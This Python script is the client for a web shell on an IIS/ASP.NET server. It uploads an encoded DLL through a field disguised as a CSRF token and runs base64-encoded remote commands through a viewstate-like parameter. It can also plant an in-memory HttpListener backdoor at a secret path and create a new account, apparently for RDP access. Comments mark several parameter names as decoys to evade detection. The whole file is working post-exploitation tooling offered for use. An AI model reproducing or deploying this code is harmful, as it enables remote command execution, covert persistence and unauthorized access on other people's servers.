import cmd
import requests
from urllib.parse import urlparse
import argparse
import base64

def base64_encode_file(filepath):
    with open(filepath, 'rb') as file:
        file_bytes = file.read()
    base64_bytes = base64.b64encode(file_bytes)
    base64_string = base64_bytes.decode('utf-8')
    return base64_string

class WebShell(cmd.Cmd):
    prompt = 'Shell>> '

    def __init__(self, url,httplistener=None,prefix=None,account=None,username=None,password=None,proxy=None):
        super().__init__()
        self.url = url
        self.param_name = "viewstate_"
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
        })
        if proxy:
            self.session.proxies = {
                "http": proxy,
                "https": proxy
            }
            self.session.verify = False
        self._init_session()
        if httplistener:
            self.prefix = prefix
            self._inject_httplistener()
        if account:
            self.username = username
            self.password = password
            self._create_account()


    def _init_session(self):
        print(f"[+] Init payload...")
        pl = base64_encode_file('System.Web.IIS.dll')
        try:
            response = self.session.post(self.url, data={'_CsrfToken': pl}, timeout=10)
            if response.ok:
                if(response.text == 'move'):
                    print(f"[+] Session  has started.")
                else:
                    print(f"[-] The response is not correct.")
                    exit()
            else:
                print(f"[-] Initial POST failed: {response.status_code}")
                exit()
        except Exception as e:
            print(f"[-] Failed to initialize session: {e}")
            exit()

    def _create_account(self):
        try:
            response = self.session.post(self.url, data={'language': self.username,'location': self.password}, timeout=10) #just decoy
            if response.ok:
                if(response.text == 'RDP'):
                    print(f"[+] Account '{self.username}' created successfully.")
                else:
                    print("[-] Account creation failed or account already exists.")
                    exit()
            else:
                print("[-] Something was wrong !")
                exit()
        except Exception as e:
            print(f"[-] Failed: {e}")
            exit()

    def _inject_httplistener(self):
        parsed = urlparse(self.url)
        secret_url = f"{parsed.scheme}://{parsed.netloc}/{self.prefix}/"
        try:
            response = self.session.post(self.url, data={'viewtoken_': secret_url}, timeout=10) # viewtoken_: just decoy
            if response.ok:
                if(response.text == 'OKE'):
                    header = {'ping':'pong'}
                    # parsed = urlparse(self.url)
                    # check_url = f"{parsed.scheme}://{parsed.netloc}/{self.path}/"
                    r = self.session.get(secret_url, headers=header, timeout=10)
                    #check ping: pong header, it will return 'woot' if OKE
                    if r.ok and 'woot' in r.text:
                        print("[+] HttpListener is running woot woot !")
                    else:
                        print("[-] Check ping failed !")
                        exit()
                else:
                    print("[-] Something was wrong !")
                    exit()
            else:
                print(f"[-] Failed: {response.status_code}")
                exit()
        except Exception as e:
            print(f"[-] Failed: {e}")
            exit()

    def _send_command(self, command):
        """Send the command via POST and return the raw output."""
        try:
            command = base64.b64encode(command.encode('utf-8'))
            response = self.session.post(self.url, data={self.param_name: command}, timeout=10)
            if response.ok:
                return response.text
            else:
                return f"Error: {response.status_code}"
        except Exception as e:
            return f"Request failed: {e}."

    def do_exit(self, line):
        r = self.session.post(self.url, data={'_EventTarget': '1'}, timeout=10)
        if(r.ok and r.text == 'clear'):
            print("[*] Session removed.")
        else:
            print("[-] Can not remove the session.")
        print("Pai pai :)")
        return True

    def default(self, line):
        """Send any command"""
        output = self._send_command(line)
        print(output)


if __name__ == '__main__':
    intro = """\r\n ¯\_(00)_/¯\r\n"""
    print(intro)
    parser = argparse.ArgumentParser(description="=> CMD Mode: python shell.py -url https://target.com/init.aspx -cmd\n=> Account Creation: shell.py -url https://target.com/init.aspx -account -user admin -pass 123456\n=> Memshell: python shell.py -url https://target.com/init.aspx -httplistener -prefix secretpath\n\n[!!!] Don't forget to type exit to remove the DLL from the Session (only CMD mode).",formatter_class=argparse.RawTextHelpFormatter,usage=argparse.SUPPRESS)
    parser.add_argument("-url", help="The URL of the Web Shell (e.g., http://target.com/init.aspx)")
    parser.add_argument("-cmd", help="Run interactive shell", action='store_true')
    parser.add_argument("-account", help="Only inject HttpLisner Memshell", action='store_true')
    parser.add_argument("-user", help="Specify username for account creation")
    parser.add_argument("-password", help="Specify password for account creation")
    parser.add_argument("-httplistener", help="inject HttpLisner Memshell", action='store_true')
    parser.add_argument("-prefix", help="Prefix path for HttpListener  (e.g., secretpath)")
    parser.add_argument("-proxy", help="Optional proxy URL (e.g., http://127.0.0.1:8080)")

    args = parser.parse_args()
    if(args.httplistener):
        if(args.prefix):
            WebShell(args.url,args.httplistener,args.prefix,args.proxy)
        else:
            print("[-] Please enter the prefix path")
    elif(args.cmd):
            WebShell(args.url,None,None,None,None,None,args.proxy).cmdloop()
    elif(args.account):
        if(args.user and args.password):
            WebShell(args.url,None,None,args.account,args.user,args.password, args.proxy)
        else:
            print("[-] Please provide both username and password for account creation.")
    else:
        parser.print_help()